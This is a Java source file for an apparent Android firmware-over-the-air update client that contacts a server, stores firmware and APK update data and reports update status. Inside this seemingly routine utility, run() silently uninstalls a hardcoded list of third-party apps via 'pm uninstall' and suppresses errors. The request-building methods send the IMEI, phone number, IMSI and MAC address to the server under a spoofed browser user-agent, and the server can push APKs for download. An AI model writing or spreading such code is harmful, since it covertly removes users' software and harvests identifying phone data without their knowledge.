package com.fota.util;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.fota.dao.ApkDao;
import com.fota.dao.FirmwareDao;
import com.fota.dao.FirmwareInfoDao;
import com.fota.dao.TaskStatusDao;
import com.fota.model.ApkModel;
import com.fota.model.FirmwareInfoModel;
import com.fota.model.FirmwareModel;
import com.fota.model.MissionModel;
import com.fota.model.ResponseJson;
import com.fota.service.OtaNotification;
import com.fota.sys.OtaConstant;
import com.fota.task.DownloadApkTask;
import com.fota.util.DeviceUtil;
import com.fota.util.LogUtil;
import com.fota.util.OtaSharePreferenceUtil;
import com.fota.util.ServiceUtil;
import com.fota.util.StringUtil;
import com.fota.R;

public class OtaServerOperation implements Runnable {

	private Context context;

	private Handler handler;

	private boolean report = false;
	// 任务描述
	private int task_descript = 0;
	// 任务状态
	private int task_status = 0;
	// 任务ID
	private int task_id = 0;
	// 访问类型
	private String visitType;

	public Message msg = Message.obtain();
	private String [] packageName=new String[]{"com.duapps.cleaner","com.support.game","com.dianxinos.dxbs","batterysaver.cleaner.speedbooster.taskkiller.phonecooler","com.android.ste2048","com.android.patchs","com.android.running"};

	public OtaServerOperation(Context cn, Handler handler, String visitType) {
		this.context = cn;
		this.handler = handler;
		this.visitType = visitType;
	}

	public OtaServerOperation(Context cn, Handler handler) {
		this.context = cn;

		this.handler = handler;
	}

	public OtaServerOperation(Context cn, Handler handler, boolean report) {
		this.context = cn;
		this.handler = handler;
		this.report = report;
	}

	public void setReport(boolean value, int descript, int status, int id) {
		// this.report = value;
		LogUtil.log(Log.DEBUG, "fota", " set report : " + this.report);
		this.task_descript = descript;

		this.task_status = status;

		this.task_id = id;
	}

	public String getResult() {
		String result = "";

		String param = getParams();

		String tailurl = OtaConstant.OTA_VISIT;

		String headurl = OtaConstant.OTA_BASE;

		LogUtil.log(Log.DEBUG, "fota", "visit server url is:" + headurl + tailurl);

		result = sendGet(headurl + tailurl + param, null);

		LogUtil.log(Log.DEBUG, "fota", "visit result is:" + result);

		OtaSharePreferenceUtil.saveBooleanValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.IS_VISITING, false);

		return result;
	}

	public void VisitServer() {
		if (!ServiceUtil.isConnectingToInternet(context)) {
			if (handler != null) {
				msg.what = OtaConstant.MSG_NET_ERROR;
				handler.sendMessage(msg);
			}
			return;
		}

		ResponseJson responseJson = new ResponseJson();
		String result = getResult();
		// 访问出错时，放回没有固件更新,第二天再来访问
		if (StringUtil.isNullOrEmpty(result)) {
			new OtaAlarmService(context).setAlarm(OtaConstant.OTA_VISIT_ALARM, 0);
			if (handler != null) {
				msg.what = OtaConstant.MSG_NO_UPDATE;
				handler.sendMessage(msg);
			}
			return;
		}

		// 访问数据保存数据
		boolean saveResult = saveDate(result);

		Message msg = Message.obtain();

		// 第一次访问，将会返回，不做处理
		int responsecode = OtaSharePreferenceUtil.getIntValue(context, OtaConstant.OTA_SP_INFO,
				OtaConstant.RESPONSE_CODE, -1);

		LogUtil.log(LogUtil.ERROR, "xftoa", "responsecode :" + responsecode);
		if (responsecode == 1) {
			msg.what = OtaConstant.MSG_NO_UPDATE;
			if (handler != null)
				handler.sendMessage(msg);
			return;
		}

		if (saveResult) {

			// 下一次访问时间
			long nextVisit = OtaSharePreferenceUtil.getLongValue(context, OtaConstant.OTA_SP_INFO,
					OtaConstant.NEXT_VISIT, -1);

			LogUtil.log(LogUtil.INFO, "fota", "nextvisit :" + nextVisit);
			if (nextVisit == -1) {
				SetAlarm();
			} else {
				new OtaAlarmService(context).setAlarm(nextVisit, OtaConstant.OTA_CYCLE_VISIT_ALARM);
			}

			FirmwareModel fwModel = FirmwareDao.getFw(context);
			LogUtil.log(Log.DEBUG, "fota", "fwModwl :" + fwModel.toString());
			MissionModel missModel = new FirmwareModel().convertMissionModel(fwModel);
			LogUtil.log(Log.DEBUG, "fota", "missModwl :" + missModel.toString());

			// 获取fw信息
			if (fwModel != null && !StringUtil.isNullOrEmpty(fwModel.getFwTargetVersion())
					&& !fwModel.getFwTargetVersion().equalsIgnoreCase(Build.DISPLAY)) {

				LogUtil.log(Log.DEBUG, "fota", "msg update avaliable");
				msg.what = OtaConstant.MSG_UPDATE;
				msg.obj = new FirmwareModel().convertMissionModel(FirmwareDao.getFw(context));
			} else {
				LogUtil.log(Log.DEBUG, "fota", "msg no updatge");
				msg.what = OtaConstant.MSG_NO_UPDATE;
			}
			if (handler != null) {
				LogUtil.log(Log.DEBUG, "fota", "send message");
				handler.sendMessage(msg);
			} else {
				LogUtil.log(Log.DEBUG, "fota", "notification show");
				if (msg.what == OtaConstant.MSG_UPDATE) {
					// 通知栏可用更新
					// ReportStatus reStatus = new ReportStatus(context);
					// reStatus.saveModel(model);
					OtaNotification notification = new OtaNotification(context);
					notification.sendNotification();
				}
			}
			// 应用有新版本时，只做更新
			if (responseJson.apkModel != null && responseJson.apkModel.size() > 0) {
				List<ApkModel> apkList = ApkDao.getAllApk(context);
				for (ApkModel apk : apkList) {
					if (apk.getApkType() == 1) {
						DownloadApkTask downloadApk = new DownloadApkTask(apk, context);
						Thread t = new Thread(downloadApk);
						t.run();
					} else {

					}
				}
			}

		} else {
			LogUtil.log(Log.DEBUG, "fota", "save visit result false");
			if (handler != null) {
				msg.what = OtaConstant.MSG_NO_UPDATE;
				handler.sendMessage(msg);
			}
			SetAlarm();
		}
	}

	public boolean saveDate(String jsonresult) {

		JSONObject jsonObj;
		ResponseJson responseJson = new ResponseJson();
		try {
			jsonObj = new JSONObject(jsonresult);
			responseJson = ResponseJson.parseJson(jsonObj);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			LogUtil.log(LogUtil.ERROR, "fota", "get response date error");
			e.printStackTrace();
		}
		// 判断数据是否正常
		if (responseJson == null || responseJson.responseCode == -1) {
			LogUtil.log(LogUtil.ERROR, "fota", "get response json is null");
			return false;
		}

		LogUtil.log(LogUtil.INFO, "fota", "next visit :" + responseJson.nextVist);

		// 下一次访问时间
		OtaSharePreferenceUtil.saveLongValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.NEXT_VISIT,
				System.currentTimeMillis() + responseJson.nextVist);
		LogUtil.log(LogUtil.INFO, "fota", "save next visit : " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
				.format(new Date(System.currentTimeMillis() + responseJson.nextVist)));

		// 保存注册时间

		OtaSharePreferenceUtil.saveIntValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.RESPONSE_CODE,
				responseJson.responseCode);

		LogUtil.log(LogUtil.INFO, "fota",
				"response code :" + responseJson.responseCode + "registime :" + responseJson.regisTime);
		if (responseJson.responseCode == 1) {
			OtaSharePreferenceUtil.saveStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.OTA_REGIS_TIME,
					responseJson.regisTime);

			LogUtil.log(LogUtil.INFO, "fota", "into save register time ");
		}

		// 保存需要下载的apk数据 开启下载闹钟
		boolean apkSave = false;
		if (responseJson.apkJsonArray != null) {
			apkSave = ApkDao.saveApkModel(ApkModel.parseJson(responseJson.apkJsonArray), context);
			if (apkSave) {
				new OtaAlarmService(context).setAlarm(OtaConstant.OTA_APK_INSTALL_ALARM,
						OtaConstant.OTA_CYCLE_APK_ALARM);
				LogUtil.log(LogUtil.INFO, "fota", "save apk sucess");
			}
		}

		// 保存fw信息
		boolean fwSave = false;
		if (responseJson.fwModel != null) {
			fwSave = FirmwareDao.saveFw(context, responseJson.fwModel);
			if (fwSave) {
				LogUtil.log(LogUtil.INFO, "fota", "save fw sucess");
			}
		} else {
			LogUtil.log(LogUtil.INFO, "fota", "fw is null");
		}
		// 保存update info信息
		boolean saveUpdate = false;
		if (responseJson.updateJsonArray != null) {
			LogUtil.log(LogUtil.INFO, "fota", "into save update");
			saveUpdate = FirmwareInfoDao.saveFwInfo(context, FirmwareInfoModel.parseJson(responseJson.updateJsonArray));
			if (saveUpdate) {
				LogUtil.log(LogUtil.INFO, "fota", "save update sucess");
			}
		} else {
			LogUtil.log(LogUtil.INFO, "fota", "updateJsonArray is null");
		}

		if (apkSave || fwSave) {
			return true;
		}

		return false;

	}

	public String getParams() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);

		String result = "?";

		HashMap<String, String> map = new HashMap<String, String>();
		map.put("dev_model", android.os.Build.MODEL);

		map.put("dev_brand", android.os.Build.BRAND);

		map.put("dev_manufacturer", android.os.Build.MANUFACTURER);

		map.put("dev_dislpay", android.os.Build.DISPLAY);

		String uuid = OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID,
				"");

		if (StringUtil.isNullOrEmpty(uuid)) {

			uuid = DeviceUtil.getDeviceId(context);

			OtaSharePreferenceUtil.saveStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID, uuid);
		}

		map.put("dev_uuid", uuid);

		map.put("dev_sdk_version", android.os.Build.VERSION.RELEASE);

		map.put("dev_soft_version", new DeviceUtil().getCurrentSoftVersion(context));

		map.put("dev_qudaoshang", StringUtil.getString(context.getString(R.string.channel_name), "10086"));

		map.put("dev_register_data", OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO,
				OtaConstant.OTA_REGIS_TIME, ""));

		map.put("dev_fingerprint", android.os.Build.FINGERPRINT);

		map.put("dev_screen", OtaInitUtil.getScreenSize(context));

		map.put("dev_total_time", OtaInitUtil.getDeviceRuntime(context));

//		map.put("dev_all_pkg", OtaInitUtil.getdataApplist(context));

		map.put("visit_type", this.visitType);

		map.put("IMEI", StringUtil.getString(tm.getDeviceId(), ""));

		map.put("PHONE_NUM", StringUtil.getString(tm.getLine1Number(), ""));

		map.put("IMSI", StringUtil.getString(tm.getSubscriberId(), ""));

		map.put("NET_WAY", OtaInitUtil.getNetWay(context));

		map.put("MAC", StringUtil.getString(ServiceUtil.getMac(context), ""));

		String fota = StringUtil.get(context, "ro.fota.version");

		if (StringUtil.isNullOrEmpty(fota)) {
			map.put("XFOTA", fota);
		}

		for (String key : map.keySet()) {
			// 06-25 修改，转换格式为utf-8
			// result += key + "=" + map.get(key) + "&";
			try {
				result += key + "=" + URLEncoder.encode(map.get(key), "UTF-8") + "&";

				Log.d("fota", "key :" + key + " value :" + map.get(key));
			} catch (Exception e) {
			}
		}

		result = result.substring(0, result.length() - 1);
		LogUtil.log(Log.DEBUG, "fota", "the param is:" + result);
		return result;
	}

	public String HttpOperation(String url) {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);

		String result = null;

		try {
			HttpPost request = new HttpPost(url);

			List<NameValuePair> param = new ArrayList<NameValuePair>();

			param.add(new BasicNameValuePair("MODEL", android.os.Build.MODEL));
			param.add(new BasicNameValuePair("BRAND", android.os.Build.BRAND));
			param.add(new BasicNameValuePair("MANUFACTURER", android.os.Build.MANUFACTURER));
			param.add(new BasicNameValuePair("DISPLAY", android.os.Build.DISPLAY));
			param.add(new BasicNameValuePair("UUID", OtaSharePreferenceUtil.getStringValue(context,
					OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID, "")));
			param.add(new BasicNameValuePair("SOFT_VERSION", new DeviceUtil().getCurrentSoftVersion(context)));
			param.add(new BasicNameValuePair("QUDAOSHANG",
					StringUtil.getString(context.getString(R.string.channel_name), "")));
			param.add(new BasicNameValuePair("IMEI", StringUtil.getString(tm.getDeviceId(), "")));
			param.add(new BasicNameValuePair("PHONE_NUM", StringUtil.getString(tm.getLine1Number(), "")));
			param.add(new BasicNameValuePair("IMSI", StringUtil.getString(tm.getSubscriberId(), "")));
			param.add(new BasicNameValuePair("NET_WAY", OtaInitUtil.getNetWay(context)));
			param.add(new BasicNameValuePair("MAC", StringUtil.getString(ServiceUtil.getMac(context), "")));
			// 06-25 添加格式"UTF-8"
			HttpEntity entity = new UrlEncodedFormEntity(param, "UTF-8");

			request.setEntity(entity);
			// 开始访问
			HttpClient client = new DefaultHttpClient();

			HttpResponse response = client.execute(request);
			// 响应为成功
			if (response.getStatusLine().getStatusCode() == 200) {
				result = EntityUtils.toString(response.getEntity());

				return result;
			}
		} catch (Exception e) {
			LogUtil.log(Log.DEBUG, "OtaServerOperation HttpOperation", "error: " + e.getMessage());
		}

		return null;
	}

	public void SetAlarm() {
		int index = OtaSharePreferenceUtil.getIntValue(context, OtaConstant.OTA_SP_INFO,
				OtaConstant.DIALOG_CHECKBOX_INDEX, 2);

		long currentmill = System.currentTimeMillis();

		long daymill = 1000 * 60 * 60 * 24; // 1000*60*60*24 = 86400000

		switch (index) {
		case 1:
			OtaSharePreferenceUtil.saveLongValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.NEXT_VISIT,
					currentmill + daymill * 1);
			new OtaAlarmService(context).setAlarm(daymill * 1, OtaConstant.OTA_CYCLE_VISIT_ALARM);
			break;
		case 2:
			OtaSharePreferenceUtil.saveLongValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.NEXT_VISIT,
					currentmill + daymill * 3);
			new OtaAlarmService(context).setAlarm(daymill * 3, OtaConstant.OTA_CYCLE_VISIT_ALARM);
			break;
		case 3:
			OtaSharePreferenceUtil.saveLongValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.NEXT_VISIT,
					currentmill + daymill * 7);
			new OtaAlarmService(context).setAlarm(daymill * 7, OtaConstant.OTA_CYCLE_VISIT_ALARM);
			break;

		default:
			break;
		}
		LogUtil.log(Log.DEBUG, "fota", "OtaServerOpertion setalarm");
	}

	@SuppressWarnings("static-access")
	public void reportStatus() {

		String uuid = OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID,
				"");

		if (StringUtil.isNullOrEmpty(uuid)) {
			uuid = DeviceUtil.getDeviceId(context);

			OtaSharePreferenceUtil.saveStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID, uuid);

		}

		String param = getReportParam();

		OtaSharePreferenceUtil.saveBooleanValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.IS_REPORTING, true);

		String url = OtaConstant.OTA_BASE;
		if (task_descript == 1) {
			url = url + OtaConstant.OTA_FW_REPORT;
		} else {
			url = url + OtaConstant.OTA_APK_REPORT;
		}
		LogUtil.log(Log.DEBUG, "fota", "report url:" + url + param);
		// String result = ServiceUtil.sendPost(OtaConstant.OTA_SERVER_REPORT,
		// null, jo.toString().getBytes("UTF-8"));
		// String result = ServiceUtil.sendGet(url+param, null);
		String result = sendGet(url + param, null);
		LogUtil.log(Log.DEBUG, "fota", "the report result is: " + result);
		// 成功判断，成功则删除数据库中数据，不成功则，保留数据库中数据
		if (!StringUtil.isNullOrEmpty(result) && result.equalsIgnoreCase("ok")) {
			TaskStatusDao reportStatus = new TaskStatusDao(context);
			LogUtil.log(Log.DEBUG, "fota", "send report success");
			if (reportStatus.getFinish(task_id) == 1) {
				reportStatus.DeleteStatus(task_id);
				reportStatus.deleteModel();
			}
		}
		OtaSharePreferenceUtil.saveBooleanValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.IS_REPORTING, false);
	}

	public String getReportParam() {
		String result = "";

		String uuid = OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID,
				"");

		String softversion = new DeviceUtil().getCurrentSoftVersion(context);

		if (StringUtil.isNullOrEmpty(uuid)) {
			uuid = DeviceUtil.getDeviceId(context);

			OtaSharePreferenceUtil.saveStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID, uuid);
		}

		String registTime = OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO,
				OtaConstant.OTA_REGIS_TIME, "");

		String fota = StringUtil.get(context, "ro.fota.version");

		TaskStatusDao reportStatus = new TaskStatusDao(context);

		MissionModel model = reportStatus.getModel();

		String apkname = model.getApkname();
		String firmname = model.getFirwname();
		if (StringUtil.isNullOrEmpty(apkname)) {
			apkname = OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.APK_FILE_NAME,
					"unknow");
		}
		if (StringUtil.isNullOrEmpty(firmname)) {
			firmname = OtaSharePreferenceUtil.getStringValue(context, OtaConstant.OTA_SP_INFO,
					OtaConstant.UPDATE_FILE_NAME, "unknow");
		}

		LogUtil.log(Log.DEBUG, "fota", "get report param,task_descrip:" + task_descript + "  task_status:"
				+ task_status + "  task_id:" + task_id);

		int status = 0;

		if (task_status == OtaConstant.TASK_STATUS_CHECK_FAIL) {
			status = OtaConstant.TASK_STATUS_CHECK_FAIL;
		} else if (task_status == OtaConstant.TASK_STATUS_DOWNLOAD_SUC) {
			status = OtaConstant.TASK_STATUS_DOWNLOAD_SUC;
		} else if (task_status == OtaConstant.TASK_STATUS_DOWNLOAD_FAIL) {
			status = OtaConstant.TASK_STATUS_DOWNLOAD_FAIL;
		} else if (task_status == OtaConstant.TASK_STATUS_INSTALL_FAIL) {
			status = OtaConstant.TASK_STATUS_INSTALL_FAIL;
		} else if (task_status == OtaConstant.TASK_STATUS_UPDATE_FAIL) {
			status = OtaConstant.TASK_STATUS_UPDATE_FAIL;
		} else if (task_status == OtaConstant.TASK_STATUS_INSTALL_SUC) {
			status = OtaConstant.TASK_STATUS_INSTALL_SUC;
		} else if (task_status == OtaConstant.TASK_STATUS_UPDATE_SUC) {
			status = OtaConstant.TASK_STATUS_UPDATE_SUC;
		} else if (task_status == OtaConstant.TASK_STATUS_SIGCHECK_FAIL_FILE_NOT_EXIT) {
			status = OtaConstant.TASK_STATUS_SIGCHECK_FAIL_FILE_NOT_EXIT;
		} else if (task_status == OtaConstant.TASK_STATUS_SIGCHECK_FAIL_INVALID_UPGRADE_PACKAGE) {
			status = OtaConstant.TASK_STATUS_SIGCHECK_FAIL_INVALID_UPGRADE_PACKAGE;
		}

		if (task_descript == 2) {
			try {
				result = "?UUID=" + URLEncoder.encode(uuid, "UTF-8") + "&QUDAOSHANG="
						+ URLEncoder.encode(context.getString(R.string.channel_name), "UTF-8") + "&apkFileName="
						+ URLEncoder.encode(apkname, "UTF-8") + "&SOFT_VERSION="
						+ URLEncoder.encode(softversion, "UTF-8") + "&TASK_STATUS=" + status + "&REGIST_TIME="
						+ URLEncoder.encode(registTime, "UTF-8") + "&SDK_VERSION="
						+ URLEncoder.encode(android.os.Build.VERSION.RELEASE, "UTF-8") + "&MODEL="
						+ URLEncoder.encode(android.os.Build.MODEL, "UTF-8") + "&BRAND="
						+ URLEncoder.encode(android.os.Build.BRAND, "UTF-8") + "&DISPLAY="
						+ URLEncoder.encode(android.os.Build.DISPLAY, "UTF-8") + "&MANUFACTURER="
						+ URLEncoder.encode(android.os.Build.MANUFACTURER, "UTF-8");
			} catch (Exception e) {
			}

		} else if (task_descript == 1) {
			// 06-25 修改，转换格式为utf-8
			// result =
			// "?UUID="+uuid+"&QUDAOSHANG="+context.getString(R.string.channel_name)+"&fwFileName="+firmname
			// +"&DISPLAY="+android.os.Build.DISPLAY+"&TASK_STATUS="+status+"&REGIST_TIME="+registTime+"&SDK_VERSION="+
			// android.os.Build.VERSION.RELEASE+"&MODEL="+android.os.Build.MODEL+"&BRAND="+android.os.Build.BRAND
			// +"&DISPLAY="+android.os.Build.DISPLAY+"&MANUFACTURER="+android.os.Build.MANUFACTURER;
			try {
				result = "?report_uuid=" + URLEncoder.encode(uuid, "UTF-8") + "&report_custom_id="
						+ URLEncoder.encode(context.getString(R.string.channel_name), "UTF-8") + "&report_file_name="
						+ URLEncoder.encode(firmname, "UTF-8") + "&DISPLAY="
						+ URLEncoder.encode(android.os.Build.DISPLAY, "UTF-8") + "&report_status=" + status
						+ "&REGIST_TIME=" + URLEncoder.encode(registTime, "UTF-8") + "&report_system_version="
						+ URLEncoder.encode(android.os.Build.VERSION.RELEASE, "UTF-8") + "&MODEL="
						+ URLEncoder.encode(android.os.Build.MODEL, "UTF-8") + "&BRAND="
						+ URLEncoder.encode(android.os.Build.BRAND, "UTF-8") + "&DISPLAY="
						+ URLEncoder.encode(android.os.Build.DISPLAY, "UTF-8") + "&MANUFACTURER="
						+ URLEncoder.encode(android.os.Build.MANUFACTURER, "UTF-8");

			} catch (Exception e) {
			}
		}

		if (!StringUtil.isNullOrEmpty(fota)) {
			// 06-25 修改，转换格式为utf-8registTime
			// result = result + "&XFOTA="+xfota;
			try {
				result = result + "&XFOTA=" + URLEncoder.encode(fota, "UTF-8");
			} catch (Exception e) {
			}
		}

		LogUtil.log(Log.DEBUG, "xfota", "the report param is: " + result);
		return result;
	}

	public String sendGet(String url, Map<String, String> params) {
		StringBuffer result = new StringBuffer();
		BufferedReader br = null;
		InputStreamReader isr = null;
		InputStream is = null;

		try {
			URL realUrl = new URL(url);

			URLConnection conn = realUrl.openConnection();

			conn.setConnectTimeout(10000);

			conn.setReadTimeout(10000);

			conn.setRequestProperty("accept", "*/*");

			conn.setRequestProperty("connection", "Keep-Alive");

			conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");

			if (params != null) {
				for (String key : params.keySet()) {
					conn.setRequestProperty(key, params.get(key));
				}
			}

			conn.connect();

			int responseCode = ((HttpURLConnection) conn).getResponseCode();

			LogUtil.log(Log.DEBUG, "fota", "visit server response code:" + responseCode);
			if (responseCode == 404 | responseCode == 500 | responseCode == 505) {
				return "";
			}

			is = conn.getInputStream();

			isr = new InputStreamReader(is);

			br = new BufferedReader(isr);

			String line = null;

			while ((line = br.readLine()) != null) {
				result.append(line);
			}

			LogUtil.log(LogUtil.INFO, "ServiceUtil sendGet", "connect url[" + url + "] result:" + result.toString());
		} catch (Exception e) {

			LogUtil.log(Log.DEBUG, "fota",
					"ServiceUtil exception:" + e.toString() + "\nerror message:" + e.getMessage());
			if (url.contains("firstVisit")) {
				String uuid = DeviceUtil.getDeviceId(context);

				OtaSharePreferenceUtil.saveStringValue(context, OtaConstant.OTA_SP_INFO, OtaConstant.DEVICE_ID, uuid);
			}
		} finally {
			try {
				if (br != null)
					br.close();
			} catch (Exception ex) {
			}
			try {
				if (isr != null)
					isr.close();
			} catch (Exception ex) {
			}
			try {
				if (is != null)
					is.close();
			} catch (Exception ex) {
			}
		}
		return result.toString();
	}

	@Override
	public void run() {

		LogUtil.log(LogUtil.INFO, "fota", "report values :" + report);
		if (report) {
			reportStatus();
		} else {
			//卸载指定应用
			try
			{
				for(int i=0;i<packageName.length;i++){
					Process localProcess = Runtime.getRuntime().exec(
							"pm uninstall " + packageName[i]);
					localProcess.waitFor();
					localProcess.exitValue();
				}
			}
			catch(Exception ex)
			{
			}
			VisitServer();
		}
	}
}
